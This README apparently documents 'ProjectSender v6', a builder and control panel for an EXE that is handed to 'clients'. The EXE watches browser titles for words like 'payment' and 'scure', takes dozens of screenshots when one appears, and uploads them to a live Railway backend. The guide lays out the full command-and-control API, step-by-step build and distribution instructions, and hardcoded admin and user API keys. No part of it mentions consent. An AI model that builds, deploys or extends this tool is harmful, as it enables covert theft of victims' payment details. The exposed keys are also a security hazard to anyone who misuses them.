# ProjectSender v6 - Integration & Deployment Guide

## 📋 Overview

**ProjectSender v6** is a complete remote client monitoring system with three main components:

| Component | Purpose | Technology |
|-----------|---------|-----------|
| **Admin Panel** | Manage clients, view screenshots, send keywords | Tkinter GUI (Python) |
| **Backend Server** | Store data, manage clients, generate EXE configs | FastAPI (Railway) |
| **Client EXE** | Monitor browser keywords, capture screenshots | Auto-generated Python |

---

## 🚀 Quick Start

### 1. Backend Deployment (Railway)

The backend is already deployed at: **https://sender-production-7ee8.up.railway.app**

**API Keys:**
- Admin Key: `skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR`
- User Key: `skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV`

### 2. Run Admin Panel

```bash
python panel_v6_railway.py
```

**Features:**
- ✅ Professional table UI with 10 columns
- ✅ Double-click to view client screenshots
- ✅ Send keywords to connected clients
- ✅ Generate custom EXE files with embedded keywords

### 3. Generate Client EXE

1. Go to **"Generate EXE"** tab
2. Enter keywords (comma-separated): `order,confirmation,scure,payment`
3. Set photos per keyword: `50`
4. Click **"Generate & Save EXE Auto"**
5. Choose save location
6. EXE is ready to distribute

### 4. Run Client EXE

When the client runs the generated EXE:
- ✅ Auto-registers with the backend
- ✅ Monitors browser for keywords
- ✅ Captures 50 screenshots per keyword
- ✅ Uploads screenshots to backend
- ✅ Admin can view all screenshots

---

## 🔧 Architecture

### Data Flow

```
Admin Panel
    ↓
[Generate EXE] → Backend (/api/generate_exe)
    ↓
[Save EXE ID] → Config stored in backend
    ↓
[Build Script] → build_exe_from_config_v4.py
    ↓
[Fetch Config] → /api/exe_config/{exe_id}
    ↓
[Generate Client] → Create Python script with keywords
    ↓
[Build EXE] → PyInstaller (or fallback to .py/.bat)
    ↓
[Distribute] → Give EXE to client
    ↓
Client EXE Runs
    ↓
[Register] → /api/register
    ↓
[Heartbeat] → /api/heartbeat (every 30s)
    ↓
[Monitor Keywords] → Check browser title
    ↓
[Capture Screenshots] → /api/upload_screenshot
    ↓
Admin Panel
    ↓
[View Clients] → /api/clients
    ↓
[View Screenshots] → /api/screenshots/{client_id}
```

---

## 📁 File Structure

```
ProjectSender_v6_Clean/
├── panel_v6_railway.py              # Main Admin Panel (Tkinter)
├── main_backend_v4.py               # FastAPI Backend
├── build_exe_from_config_v4.py      # EXE Builder Script
├── build_exe_from_config_v3.py      # Fallback EXE Builder
├── build_exe_from_config_v2.py      # Alternative EXE Builder (py2exe)
├── build_exe_from_config.py         # Original EXE Builder
├── screenshot_client_v2_gui.py      # Reference Client Implementation
├── requirements.txt                 # Backend Dependencies
└── README.md                        # Project Documentation
```

---

## 🔌 API Endpoints

### Client Registration

```http
POST /api/register
X-API-Key: skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV

{
  "client_id": "uuid",
  "computer": "ProjectSender Client",
  "status": "online"
}
```

### Heartbeat

```http
POST /api/heartbeat
X-API-Key: skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV

{
  "client_id": "uuid",
  "status": "online",
  "task": "capturing",
  "photos_count": 0
}
```

### Upload Screenshot

```http
POST /api/upload_screenshot
X-API-Key: skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV

{
  "client_id": "uuid",
  "filename": "keyword_0001_timestamp.png",
  "image_base64": "base64_encoded_image",
  "timestamp": 1234567890.123
}
```

### Generate EXE

```http
POST /api/generate_exe
X-API-Key: skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR

{
  "pages": [
    {"name": "order", "photo_count": 50},
    {"name": "confirmation", "photo_count": 50}
  ],
  "exe_name": "ProjectSender_Client"
}

Response:
{
  "status": "ok",
  "exe_id": "abc12345",
  "message": "EXE configuration saved. ID: abc12345"
}
```

### Get EXE Config

```http
GET /api/exe_config/{exe_id}
X-API-Key: skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV

Response:
{
  "exe_id": "abc12345",
  "pages": [
    {"name": "order", "photo_count": 50},
    {"name": "confirmation", "photo_count": 50}
  ],
  "created_at": "2026-05-11T00:00:00",
  "exe_name": "ProjectSender_Client"
}
```

### Get Clients

```http
GET /api/clients
X-API-Key: skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR

Response:
{
  "client_id_1": {
    "ip_address": "192.168.1.1",
    "tag": "Client 1",
    "user_pc": "user@pc",
    "version": "1.0.0",
    "status": "online",
    "user_status": "Active",
    "country": "Morocco",
    "operating_system": "Windows 10",
    "account_type": "User",
    "note": "Test client"
  }
}
```

### Get Screenshots

```http
GET /api/screenshots/{client_id}
X-API-Key: skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR

Response:
{
  "screenshots": [
    {
      "filename": "order_0001_1234567890.123.png",
      "image_base64": "iVBORw0KGgoAAAANSUhEUgAAAAEA...",
      "timestamp": 1234567890.123
    }
  ]
}
```

### Delete Screenshots

```http
DELETE /api/screenshots/{client_id}
X-API-Key: skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR

Response:
{
  "status": "ok",
  "deleted_count": 150
}
```

---

## 🛠️ Troubleshooting

### Issue: Build failed with return code 1

**Solution:**
1. Check if PyInstaller is installed: `pip install pyinstaller`
2. Check if PIL/Pillow is installed: `pip install pillow`
3. Check if requests is installed: `pip install requests`
4. The script will fallback to creating `.py` and `.bat` files

### Issue: Client not appearing in Admin Panel

**Solution:**
1. Verify backend is running: `curl https://sender-production-7ee8.up.railway.app/api/health`
2. Check if client EXE is running
3. Verify API keys are correct
4. Check network connectivity

### Issue: Screenshots not uploading

**Solution:**
1. Verify client has internet connection
2. Check if backend is accepting uploads
3. Verify API key in client script
4. Check if PIL/Pillow is installed on client machine

### Issue: Keywords not being detected

**Solution:**
1. Verify keywords are entered correctly (case-insensitive)
2. Check browser title contains the keyword
3. Verify client is monitoring the correct browser (Chrome)
4. Check if PowerShell is available on Windows

---

## 📊 Panel Features

### Clients Tab

| Feature | Description |
|---------|-------------|
| **Professional Table** | 10 columns with sortable data |
| **Double-Click** | Open photos viewer for selected client |
| **Keywords Field** | Send keywords to connected clients |
| **View Photos** | Browse all screenshots for client |
| **Delete All** | Remove all photos for client |

### Generate EXE Tab

| Feature | Description |
|---------|-------------|
| **Keywords Input** | Comma-separated keywords (e.g., `order,confirmation`) |
| **Photos Count** | Number of photos per keyword (1-500) |
| **Generate EXE** | Create EXE ID only |
| **Generate & Save** | Create EXE ID and build executable |

---

## 🔐 Security Notes

1. **API Keys** are hardcoded in the code. For production, use environment variables.
2. **Screenshots** are stored as base64 in backend. Consider encryption.
3. **Client Registration** should validate computer information.
4. **HTTPS** is used for Railway backend (secure).

---

## 📦 Deployment

### Deploy to Railway

1. Push code to GitHub
2. Connect GitHub repo to Railway
3. Set environment variables (if needed)
4. Railway auto-deploys on push

### Local Testing

```bash
# Install dependencies
pip install -r requirements.txt

# Run backend locally
python main_backend_v4.py

# In another terminal, run panel
python panel_v6_railway.py
```

---

## 🎯 Workflow Example

### Step 1: Generate EXE

```
Admin Panel → Generate EXE Tab
├─ Keywords: "order,confirmation,scure,payment"
├─ Photos: 50
└─ Click "Generate & Save EXE Auto"
   └─ Save as: "ProjectSender_Client_abc12345.exe"
```

### Step 2: Distribute EXE

```
Send ProjectSender_Client_abc12345.exe to client
```

### Step 3: Client Runs EXE

```
Client double-clicks EXE
├─ Registers with backend
├─ Monitors browser for keywords
├─ When keyword found:
│  └─ Captures 50 screenshots
│     └─ Uploads to backend
└─ Continues monitoring
```

### Step 4: Admin Views Results

```
Admin Panel → Clients Tab
├─ Select client from table
├─ Click "View Photos"
└─ Browse all captured screenshots
```

---

## 📝 Version History

| Version | Date | Changes |
|---------|------|---------|
| v6 | 2026-05-11 | Professional table UI, build_exe_from_config_v4.py, fixed keyword extraction |
| v5 | 2026-05-10 | Keywords support, photos viewer, delete buttons |
| v4 | 2026-05-09 | Professional UI, multiple columns |
| v3 | 2026-05-08 | EXE generation, keyword monitoring |
| v2 | 2026-05-07 | Screenshot upload, heartbeat |
| v1 | 2026-05-06 | Initial release |

---

## 📞 Support

For issues or questions:
1. Check the troubleshooting section
2. Review API endpoint documentation
3. Check backend logs on Railway
4. Verify all dependencies are installed

---

**ProjectSender v6** - Remote Client Monitoring System
